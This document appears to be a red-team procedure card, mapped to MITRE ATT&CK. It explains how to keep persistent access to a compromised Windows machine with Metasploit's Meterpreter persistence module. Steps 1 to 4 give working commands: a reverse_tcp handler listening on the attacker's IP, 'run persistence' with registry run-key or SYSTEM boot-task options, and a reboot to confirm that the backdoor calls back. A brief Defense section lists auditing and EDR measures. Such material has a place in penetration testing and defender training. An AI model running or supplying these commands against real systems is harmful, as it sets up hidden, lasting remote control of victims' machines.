---
id: d7f356eb-774d-4fa7-ab72-6a5e496fab4c
name: Windows-Persistence-with-Meterpreter
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.400890+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Registry-Run-Keys-Startup-Folder|T1060 - Registry Run Keys /
    Startup Folder]]
  - '[[techniques/Scheduled-Task|T1053 - Scheduled Task]]'
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter-Basic]]'
  - '[[tags/Persistence-Startup]]'
commands:
  - '[[commands/meterpreter-run-persistence]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Windows-Persistence-with-Meterpreter

## Summary

This procedure outlines how to establish persistent access on a compromised Windows system using the Meterpreter persistence module within Metasploit. It creates a backdoor that automatically reconnects to the attacker's listener upon system boot or user logon, ensuring continued access despite reboots or session disruptions. This technique leverages registry run keys or scheduled tasks to execute a reverse payload, commonly used in post-exploitation phases for long-term control.

## Description

In a red team engagement or penetration test, after gaining initial access via a Meterpreter session, attackers often need to maintain foothold without relying on fragile sessions. The 'run persistence' module in Meterpreter automates the deployment of a persistent agent by injecting a payload into the registry (for user logon) or creating a scheduled task (for system boot). This allows the payload to execute with user or SYSTEM privileges, connecting back to the attacker's handler. The procedure requires administrative privileges and assumes an active Meterpreter session. Success results in a self-sustaining backdoor that survives reboots, enabling remote command execution, data exfiltration, or lateral movement. Note that this maps to MITRE ATT&CK techniques for persistence via startup mechanisms.

## Requirements

1. Administrative privileges on the target Windows system (local or domain admin).
2. An established Meterpreter session via an exploit or initial payload delivery.
3. Metasploit Framework running on the attacker's machine with a multi/handler listener configured.
4. Network connectivity from the target to the attacker's IP and port.
5. Tools: Metasploit Framework (msfconsole and Meterpreter).

## Defense

- Regularly audit Windows Registry keys (e.g., HKLM\Software\Microsoft\Windows\CurrentVersion\Run) and scheduled tasks (via Task Scheduler) for unauthorized entries using tools like Sysinternals Autoruns or PowerShell scripts.
- Implement application whitelisting (e.g., AppLocker or WDAC) to prevent execution of unsigned or suspicious binaries in %TEMP% or startup locations.
- Enable endpoint detection and response (EDR) solutions to monitor for anomalous process creation, network connections from persistence payloads, or modifications to startup artifacts.
- Use privilege access management to limit admin rights and enforce least privilege principles.
- Monitor for unexpected outbound connections to known C2 ports or IPs using network segmentation and IDS/IPS.

## Objectives

1. Deploy a persistent reverse shell that activates on user logon or system boot.
2. Ensure the backdoor reconnects to the attacker's listener automatically.
3. Verify persistence by simulating a reboot and confirming callback.

## Instructions

### Step 1: Verify Meterpreter Session and Listener

**Context**: Before setting up persistence, confirm you have an active Meterpreter session and a matching multi/handler listener running on your attack machine to catch the persistent connections. This ensures the payload can phone home successfully.

**Command** ([[commands/meterpreter-run-persistence]]):

First, in msfconsole, set up the handler:

```msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j
```

Then, in the Meterpreter session, background it if needed and proceed.

> This step prepares the infrastructure. Expected output in msfconsole: "[*] Started reverse TCP handler on <your_ip>:4444". No output in Meterpreter for this prep; proceed if session is stable.

### Step 2: Execute Persistence Module with User Logon Option

**Context**: Use the 'run persistence' command in Meterpreter to create a registry-based backdoor that triggers on user logon. Specify the attacker's IP and port for the reverse connection. This uses the default payload (windows/meterpreter/reverse_tcp) and writes to %TEMP%.

**Command** ([[commands/meterpreter-run-persistence]]):

In the Meterpreter prompt:

```meterpreter
run persistence -U -i 5 -p 4444 -r <your_ip>
```

> The -U flag adds a registry entry for user logon, -i sets connection attempt interval (5 seconds), -p and -r define the listener details. This step injects an executable payload that executes on logon. If successful, Meterpreter outputs: "[*] Persistence service written to <path>" and "[*] Persistence script written to <path>". Verify by checking the registry with 'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run' in a shell (via 'shell' command).

### Step 3: Alternative - System Boot Persistence as Service

**Context**: For higher privileges, use the -S option to install as a Windows service via scheduled task, ensuring execution on boot with SYSTEM rights. This is useful if targeting machine-wide persistence.

**Command** ([[commands/meterpreter-run-persistence]]):

In the Meterpreter prompt:

```meterpreter
run persistence -S -i 5 -p 4444 -r <your_ip>
```

> The -S flag creates a scheduled task running at boot with SYSTEM privileges. Expected output: "[*] Creating scheduled task 'MgFwFnGq' to execute payload" and confirmation of task creation. Verify with 'schtasks /query /tn MgFwFnGq' in a shell. Test by rebooting the target and monitoring the handler for a new session.

### Step 4: Verify and Test Persistence

**Context**: After deployment, test the persistence by spawning a shell, rebooting the target, and confirming a new session connects back. Clean up if in a test environment.

**Instructions**: From Meterpreter, run 'shell' to access cmd.exe, then 'shutdown /r /t 0' to reboot. Monitor msfconsole handler for incoming connection.

> Expected output on reboot: New Meterpreter session in handler ("[*] Meterpreter session X opened"). Success if connection establishes within the interval (-i value). If no connection, check firewall, network, or privileges.
